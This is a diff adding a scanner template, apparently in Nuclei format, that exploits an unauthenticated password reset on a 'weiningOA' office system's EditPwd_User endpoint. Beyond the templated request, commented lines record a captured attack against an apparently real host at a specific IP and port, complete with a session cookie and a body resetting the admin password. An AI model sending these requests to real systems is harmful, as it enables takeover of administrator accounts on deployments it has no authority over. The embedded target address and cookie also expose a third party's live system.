@@ -1,0 +1,46 @@
+id: weiningOA-EditPwd_User-restpasswd
+info:
+  name: weiningOA-EditPwd_User-mimachongzhi
+  author: apple
+  severity: high
+  description: 存在前台任意密码重置。具体完整数据包看本文件。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /OAMenu/Login/EditPwd_User HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Authorization: null
+        X-Requested-With: XMLHttpRequest
+        Origin: http://{{Hostname}}
+        Connection: close
+        Referer: http://{{Hostname}}/
+        Content-Length: 13
+
+        user=zhangsan
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+#POST /OAMenu/Login/EditPwd_User HTTP/1.1
+#Host: 111.40.57.3:6115
+#User-Agent: Mozilla/5.0 (Linux; Android 11; Galaxy S6 Build/RQ1A.210105.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 XWEB/1110039 MMWEBSDK/20231105 MMWEBID/3211 MicroMessenger/8.0.44.2502(0x28002C36) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64
+#Accept: */*
+#Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+#Accept-Encoding: gzip, deflate, br
+#Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+#X-Requested-With: XMLHttpRequest
+#Content-Length: 35
+#Origin: http://111.40.57.3:6115
+#Connection: close
+#Referer: http://111.40.57.3:6115/
+#Cookie: .AspNetCore.Antiforgery.6oH8u6N37Uc=CfDJ8GUaI3QKEMZEv5HC9MP8Clb-p3-MX2dodKIiFkWmMqYV6uQ0QBCu0iarWsMe1Vc8EFnx3-NK_3p0_Y9Ro1GVOy-xh6Be7XtUo0fB8bgHwH0yCD-9dskHNclmuKgRxuNQoHO8mzHJvmw3oyI0mT04Ci0
+
+#user=admin&newpwd=zhanglibai123@!@#
